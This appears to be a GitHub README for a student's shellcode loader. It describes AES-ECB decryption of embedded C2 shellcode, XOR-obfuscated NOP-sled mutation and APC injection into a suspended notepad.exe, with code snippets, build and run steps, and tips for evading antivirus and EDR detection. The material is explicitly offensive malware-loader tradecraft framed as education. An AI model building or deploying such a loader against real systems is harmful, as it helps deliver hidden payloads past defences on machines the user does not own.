# 🕵️ Shellcode Mutator & APC Injection — Research Tool
 
> **⚠️ FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
> This project demonstrates offensive security techniques in a controlled lab context.
> Use only on systems and environments you own or have explicit written permission to test.
> Misuse may violate computer fraud laws in your jurisdiction.
 
---
 
## 📌 Overview
 
This project implements a **shellcode delivery pipeline** that combines multiple evasion techniques to study how modern malware loaders operate. It is intended for cybersecurity students and researchers learning about process injection, shellcode obfuscation, and AV/EDR evasion concepts.
 
The pipeline runs as follows:
 
```
AES-encrypted shellcode (demon.x64.h)
        │
        ▼
   AES-ECB Decrypt  (Decrypt.h / BCrypt API)
        │
        ▼
   NOP Sled Prepend  (ShellcodeMutator.h)
        │
        ▼
   XOR Encode  (Decoder.h)
        │
        ▼
   APC Injection → notepad.exe  (main.cpp / WinAPI)
        │
        ▼
   Shellcode Execution
```
 
---
 
## 🏗️ Architecture
 
```
┌──────────────────────────────────────────────────────────┐
│                      main.cpp                            │
│                                                          │
│  1. mutate()  ──→  Decrypt + prepend NOP sled            │
│  2. XOR()     ──→  Encode entire buffer                  │
│  3. CreateProcess (notepad.exe, SUSPENDED)               │
│  4. VirtualAllocEx → WriteProcessMemory                  │
│  5. VirtualProtectEx (PAGE_EXECUTE_READWRITE)            │
│  6. QueueUserAPC → ResumeThread                          │
└──────────────────────────────────────────────────────────┘
         ▲                    ▲
         │                    │
┌────────┴──────┐    ┌────────┴──────────┐
│  Mutate.h     │    │  Decoder.h        │
│  ─────────    │    │  ─────────        │
│  AESDecrypt() │    │  XOR()            │
│  add_nops()   │    │  NOP-aware        │
└───────────────┘    └───────────────────┘
         ▲
         │
┌────────┴──────────────────┐
│  Decrypt.h                │
│  ─────────                │
│  BCrypt AES-ECB           │
│  128 / 192 / 256-bit key  │
└───────────────────────────┘
         ▲
         │
┌────────┴──────────────────┐
│  demon.x64.h              │
│  ─────────                │
│  shellcode[]  (encrypted) │
│  aesKey[]                 │
└───────────────────────────┘
```
 
---
 
## 📁 File Reference
 
| File | Role |
|---|---|
| `main.cpp` | Entry point — orchestrates the full pipeline and performs APC injection |
| `Decoder.h` | XOR encode/decode — NOP-sled-aware, rolling key |
| `Decrypt.h` | AES-ECB decryption via Windows BCrypt API |
| `Mutate.h` | Calls `AESDecrypt` then prepends XOR'd NOP sled via `ShellcodeMutator` |
| `ShellcodeMutator.h` | Class that prepends NOP bytes (XOR'd with `key[0]`) to the shellcode |
| `demon.x64.h` | Shellcode payload container — **you fill this in** |
 
---
 
## 🔬 Techniques Explained
 
### 1. AES-ECB Decryption
 
The shellcode is stored **pre-encrypted** in `demon.x64.h`. At runtime it is decrypted using the Windows **BCrypt API** in **ECB mode** (no IV, block-aligned).
 
```cpp
// Decrypt.h — BCrypt AES-ECB
BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_ECB, ...);
BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key.data(), key.size(), 0);
BCryptDecrypt(hKey, ciphertext, ..., plaintext, ..., &resultSize, 0);
```
 
Supported key sizes: **128-bit (16 bytes)**, **192-bit (24 bytes)**, **256-bit (32 bytes)**.
 
> **Why ECB?** ECB has no IV dependency, which simplifies key-only storage. For stronger simulation, CBC or CTR would add an IV prefix.
 
---
 
### 2. Shellcode Mutation — NOP Sled Prepend
 
`ShellcodeMutator` prepends a configurable number of **XOR-obfuscated NOP bytes** (`0x90`) to the shellcode. This alters the byte signature without changing execution behavior (NOPs are decoded by the XOR pass).
 
```cpp
// ShellcodeMutator.h
uint8_t nops = 0x90 ^ key[0];         // NOP byte is obfuscated
shellcode.insert(shellcode.begin(), nops);  // prepended N times
```
 
This technique makes static signature matching harder — the shellcode's leading bytes differ from any known pattern.
 
---
 
### 3. XOR Encoding
 
After mutation, the **entire buffer** is XOR-encoded. The encoder is NOP-sled-aware — the first `nopCount` bytes are encoded with `key[0]` only, and the rest use a **rolling key** derived from the full key string.
 
```cpp
// Decoder.h — XOR with NOP-sled awareness
for (size_t i = 0; i < size; ++i) {
    if (i < nops)
        buffer[i] ^= key[0];              // NOP region: single-byte key
    else
        buffer[i] ^= key[(i - nops) % keylen];  // payload: rolling key
}
```
 
This two-region encoding ensures the NOP sled decodes correctly back to `0x90` when XOR'd again at execution.
 
---
 
### 4. APC Injection
 
APC (Asynchronous Procedure Call) injection is used to execute shellcode inside a legitimate Windows process without creating a visible remote thread.
 
```
CreateProcess(notepad.exe, CREATE_SUSPENDED)
        ↓
VirtualAllocEx  →  allocate RWX memory in target
        ↓
WriteProcessMemory  →  write shellcode bytes
        ↓
VirtualProtectEx  →  mark as PAGE_EXECUTE_READWRITE
        ↓
QueueUserAPC((PAPCFUNC)mem, thread, ...)
        ↓
ResumeThread  →  APC fires → shellcode executes
```
 
**Why APC over `CreateRemoteThread`?**
 
| Technique | Visibility | Detection Risk |
|---|---|---|
| `CreateRemoteThread` | High | Commonly flagged by EDR |
| `QueueUserAPC` | Lower | Less monitored, uses existing thread |
 
> **Note:** `QueueUserAPC` requires the target thread to enter an alertable wait state. `CREATE_SUSPENDED` + `ResumeThread` triggers APC dispatch on resume.
 
---
 
## ⚙️ Setup
 
### Prerequisites
 
- **OS:** Windows 10/11 x64
- **IDE:** Visual Studio 2022
  - Workload: `Desktop development with C++`
- **SDK:** Windows SDK (included with VS, needed for `bcrypt.lib`)
- **Architecture:** x64 — both the injector and the shellcode must match
### Clone
 
```bash
git clone https://github.com/khalid609/ShellcodeMutator-APCInjection.git
cd ShellcodeMutator-APCInjection
```
 
---
 
## 🚀 How to Use
 
Follow these steps in order before building.
 
### Step 1 — Generate your shellcode
 
Generate x64 shellcode using a C2 framework (e.g. Havoc, Cobalt Strike, MSF) then **xor it** and **AES-ECB encrypt** it with a key of your choice (16, 24, or 32 bytes).
**for encode use https://github.com/khalid609/Shellcode-Encoder**
**for encryption use https://github.com/khalid609/AES-Shellcode-Encryptor**
 
### Step 2 — Fill in `demon.x64.h`
 
```cpp
// demon.x64.h
std::vector<uint8_t> shellcode = {
    0xAB, 0xCD, ...    // paste your AES-encrypted shellcode bytes here
};
 
std::vector<uint8_t> aesKey = {
    0x00, 0x01, ...    // paste your AES key here (16 / 24 / 32 bytes)
};
```
 
### Step 3 — Set the XOR key in `main.cpp`
 
```cpp
// main.cpp
const std::string key = "YourXORKeyHere";   // must not be empty
```
 
> ⚠️ An empty key (`""`) will cause the XOR and NOP functions to return early and do nothing. Always set a non-empty key.
 
### Step 4 — (Optional) Adjust the NOP sled size
 
```cpp
// Mutate.h
mutation.add_nops(5, key);   // change 5 to any count you want
```
 
```cpp
// main.cpp
XOR(shellcode.data(), shellcode.size(), key, 5);   // must match the count above
```
 
> Both values must be equal — the NOP count passed to `add_nops` and the `nopCount` argument to `XOR`.
 
### Step 5 — Configure the target process
 
By default the injector targets `notepad.exe`. To change it, edit `main.cpp`:
 
```cpp
BOOL cprocess = CreateProcessA(
    "C:\\Windows\\System32\\notepad.exe",  // ← change path here
    ...
);
```
 
### Step 6 — Build
 
```
Visual Studio → Build → Build Solution  (Ctrl+Shift+B)
Platform Target: x64
```
 
Verify `bcrypt.lib` is linked — the pragma in `Decrypt.h` handles this automatically:
 
```cpp
#pragma comment(lib, "bcrypt.lib")
```
 
### Step 7 — Run
 
Execute the compiled binary. The console output will trace each step:
 
```
Success: Process created in suspended state.
Success: Memory allocated in remote process.
Success: Shellcode written to remote process memory.
Success: Memory protection changed to executable.
Success: APC queued for execution.
Success: Thread resumed. Shellcode should now execute.
```
 
---
 
## ⚠️ Known Limitations
 
| Issue | Detail |
|---|---|
| AES-ECB mode | ECB has no IV — identical plaintext blocks produce identical ciphertext. CBC or CTR preferred for stronger security. |
| `PAGE_EXECUTE_READWRITE` | Allocating RWX memory in one step is a common EDR heuristic trigger. A two-step alloc (RW → RX) is stealthier. |
| Empty XOR key | `XOR()` and `add_nops()` both return early if the key is empty — always set a non-empty key. |
| NOP count mismatch | `add_nops(N)` and `XOR(..., N)` must use the same `N` value or the NOP region decodes incorrectly. |
| Hard-coded target | `notepad.exe` path is hard-coded — make configurable for broader lab use. |
 
---
 
## 🛡️ What This Teaches
 
| Topic | What you learn |
|---|---|
| AES-ECB Decryption | Runtime decryption of embedded payloads using BCrypt |
| XOR Obfuscation | Rolling-key XOR and why key length matters |
| NOP Sled Mutation | How signature evasion works at the byte level |
| APC Injection | Stealthy code execution inside a legitimate process |
| WinAPI Memory Management | `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx` |
| Process Creation | `CreateProcess` with `CREATE_SUSPENDED` and handle management |
| BCrypt API | Native Windows crypto without third-party libraries |
| Handle Hygiene | Proper cleanup of process/thread handles on all code paths |
 
---
 
## 👤 Author
 
**Khalid** — Cybersecurity Student
GitHub: [@khalid609](https://github.com/khalid609)
 
---
 
## 📄 Disclaimer
 
This project is released for **educational use only** in isolated lab environments.
The author takes no responsibility for misuse. Never deploy against systems you do not own.
